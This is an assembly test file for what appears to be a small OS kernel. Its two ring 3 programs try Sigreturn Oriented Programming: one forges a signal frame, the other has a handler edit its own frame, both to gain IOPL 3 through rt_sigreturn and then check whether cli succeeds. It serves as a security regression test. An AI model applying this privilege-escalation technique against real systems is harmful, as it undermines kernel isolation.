; =============================================================================
; sigreturn_forgery.s - Two ring 3 programs that try to get IOPL 3 from
; rt_sigreturn (SROP: Sigreturn Oriented Programming).
;
; Used by atk_sigreturn_forgery.c through usertask (process_management).
; rt_sigreturn loads every register from the frame on the program's own
; stack. EFLAGS with IOPL = 3 would let ring 3 run cli / in / out.
;
;   srop_forged   no signal at all: build a fake frame, call rt_sigreturn
;   srop_tamper   a real SIGUSR1 handler edits its own frame's EFLAGS
;
; Mailbox (usertask.h): [0] = 1 started, [1] = 0x10 if cli worked from
; ring 3 (the attack won), [2] = EFLAGS after the return.
; Layout of the frame: sigframe_t in core/signal/signal.h.
; =============================================================================

SYS_EXIT          equ 1
SYS_GETPID        equ 2
SYS_KILL          equ 58
SYS_RT_SIGACTION  equ 69
SYS_RT_SIGRETURN  equ 76
SIGUSR1           equ 10

USER_CODE   equ 0x40000000          ; usertask copies the program here
MAILBOX     equ 0x40000F00
SCRATCH     equ 0x40001000          ; bottom of the stack page

FRAME_SIZE  equ 92                  ; sizeof(sigframe_t)
SAVED_ESP   equ 68                  ; offsets inside sigframe_t
SAVED_EIP   equ 72
SAVED_FLAGS equ 76
SAVED_MASK  equ 80
IOPL3       equ 0x3000

global srop_forged, srop_forged_end
global srop_tamper, srop_tamper_end

section .text

; ---------- 1. A frame no signal ever made ----------
srop_forged:
    mov dword [MAILBOX], 1
    sub esp, FRAME_SIZE
    mov ebp, esp                                    ; ebp = the fake frame
    lea eax, [ebp + FRAME_SIZE]
    mov [ebp + SAVED_ESP], eax                      ; come back to our stack
    mov dword [ebp + SAVED_EIP], USER_CODE + (.after - srop_forged)
    mov dword [ebp + SAVED_FLAGS], 0x202 | IOPL3    ; the prize
    mov dword [ebp + SAVED_MASK], 0
    lea esp, [ebp + 4]                              ; as if a handler just returned
    mov eax, SYS_RT_SIGRETURN
    int 0x80
    jmp .exit                                       ; refused without killing us
.after:
    pushfd
    pop eax
    mov [MAILBOX + 8], eax
    test eax, IOPL3
    jz .exit
    cli                                             ; ring 3 with IOPL 3: allowed
    sti
    mov dword [MAILBOX + 4], 0x10                   ; the attack won
.exit:
    mov eax, SYS_EXIT
    xor ebx, ebx
    int 0x80
srop_forged_end:

; ---------- 2. A real frame, edited by its own handler ----------
srop_tamper:
    mov dword [MAILBOX], 1
    ; rt_sigaction(SIGUSR1, {handler, 0, 0, 0}, 0, 8)
    mov dword [SCRATCH + 0], USER_CODE + (.handler - srop_tamper)
    mov dword [SCRATCH + 4], 0
    mov dword [SCRATCH + 8], 0
    mov dword [SCRATCH + 12], 0
    mov eax, SYS_RT_SIGACTION
    mov ebx, SIGUSR1
    mov ecx, SCRATCH
    xor edx, edx
    mov esi, 8
    int 0x80
    ; kill(getpid(), SIGUSR1): the handler runs on the way back
    mov eax, SYS_GETPID
    int 0x80
    mov ebx, eax
    mov eax, SYS_KILL
    mov ecx, SIGUSR1
    int 0x80
    ; back from the handler, through rt_sigreturn
    pushfd
    pop eax
    mov [MAILBOX + 8], eax
    test eax, IOPL3
    jz .exit
    cli
    sti
    mov dword [MAILBOX + 4], 0x10                   ; the attack won
.exit:
    mov eax, SYS_EXIT
    xor ebx, ebx
    int 0x80
.handler:                                           ; handler(sig): ESP = &frame->ret
    or dword [esp + SAVED_FLAGS], IOPL3             ; ask for IOPL 3 on the way back
    ret                                             ; -> the kernel's trampoline
srop_tamper_end:
